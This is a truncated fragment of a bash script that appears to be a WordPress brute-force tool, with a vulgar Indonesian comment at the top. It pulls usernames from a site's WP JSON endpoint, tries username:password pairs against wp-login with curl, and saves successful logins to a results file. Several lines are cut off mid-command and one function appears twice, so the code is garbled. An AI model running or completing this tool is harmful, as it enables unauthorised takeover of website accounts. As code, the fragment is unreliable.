#!/bin/bash
# HELLO KONTOL NGAPAIN SAMPAI SINI
...
function _GetUserWPJSON() {
        Target="${1}";
        UsernameLists=$(curl --connect-timeout ${curl_timeout} --max-time ${curl_timeou        >
        echo ""
        if [[ -z ${UsernameLists} ]];
        then
...
function _GetUserWPJSON() {
        Target="${1}";
        UsernameLists=$(curl --connect-timeout ${curl_timeout} --max-time ${curl_timeout} -s "$                                                       >
        echo ""
        if [[ -z ${UsernameLists} ]];
        then
                echo -e "${YEL}INFO: Cannot detect Username!${CLR}"
...
function _TestLogin() {
        ...
        Username="${2}"
        Password="${3}"
        LetsTry=$(curl --connect-timeout ${curl_timeout} --max-time ${curl_timeout} -s         >
        if [[ ! -z $(echo ${LetsTry} | grep login_error | grep div) ]];
        then
                echo -e "${YEL}INFO: Invalid ${Target} ${Username}:${Password}${CLR}"
        elif [[ $(echo ${LetsTry} | grep "HTTP_STATUS_CODE_X" | awk '{print $2}') == "3        >
        then
                echo -e "${GRN}[!] FOUND ${Target} \e[30;48;5;82m ${Username}:${Passwor        >
                echo "${Target} [${Username}:${Password}]" >> wpbf-results.txt
        else
                echo -e "${YEL}INFO: Invalid ${Target} ${Username}:${Password}${CLR}"
        fi
...
' | lolcat
echo '             <==  wordpress brute force ==> ' | lolcat
echo ''
...
then
	echo -e "${RED}ERROR: Invalid wordpress wp-login! or targets are not vuln!${CLR}"
	exit
fi
